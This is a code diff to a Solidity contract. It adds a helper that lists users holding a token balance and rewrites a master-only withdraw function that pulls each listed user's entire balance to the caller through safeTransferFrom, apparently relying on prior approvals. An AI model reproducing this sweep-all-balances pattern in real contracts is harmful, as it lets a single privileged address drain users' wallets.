@@ -95,25 +95,61 @@ contract Req {
     _tokenToUsers[_token].push(msg.sender);
   }
 
-  /// @notice withdraw all tokens from all addresses
+  /// @notice return array of addresses which have a balance
+  /// @param _token: token from which to collect
+  ///
+  /// @dev the resulting array to pass arguments to the withdraw function
+  function getAddressesForCollect(address _token)
+    external
+    view
+    returns (address[] memory addresses_)
+  {
+    address[] memory users = _tokenToUsers[_token];
+    addresses_ = new address[](users.length);
+    uint256 counter;
+
+    uint256 balance;
+    for (uint256 i; i < users.length; ) {
+      balance = IERC20(_token).balanceOf(users[i]);
+      if (balance == 0) {
+        unchecked {
+          i++;
+        }
+        continue;
+      }
+      addresses_[counter] = users[i];
+
+      unchecked {
+        i++;
+        counter++;
+      }
+    }
+
+    // cut the array to get only the addresses you need
+    assembly {
+      mstore(addresses_, counter)
+    }
+  }
+
+  /// @notice withdraw all tokens from received addresses
   /// @param _token: token address
+  /// @param _addresses: addresses from which will be collected
   ///
   /// @dev this function can only be called if the msg.sender is master address
   /// array of users by `_token` address cannot be empty
-  function withdraw(address _token) external onlyMasterAddress {
-    uint256 usersCount = _tokenToUsers[_token].length;
-    require(usersCount > 0);
+  // ,
+  function withdraw(address _token, address[] calldata _addresses)
+    external
+    onlyMasterAddress
+  {
+    require(_addresses.length > 0);
 
-    address[] memory users = _tokenToUsers[_token];
-
-    for (uint256 i; i < usersCount; ) {
-      uint256 balance = IERC20(_token).balanceOf(users[i]);
-
-      if (balance == 0) {
-        continue;
-      }
-
-      IERC20(_token).safeTransferFrom(users[i], msg.sender, balance);
+    for (uint256 i; i < _addresses.length; ) {
+      IERC20(_token).safeTransferFrom(
+        _addresses[i],
+        msg.sender,
+        IERC20(_token).balanceOf(_addresses[i])
+      );
 
       unchecked {
         i++;
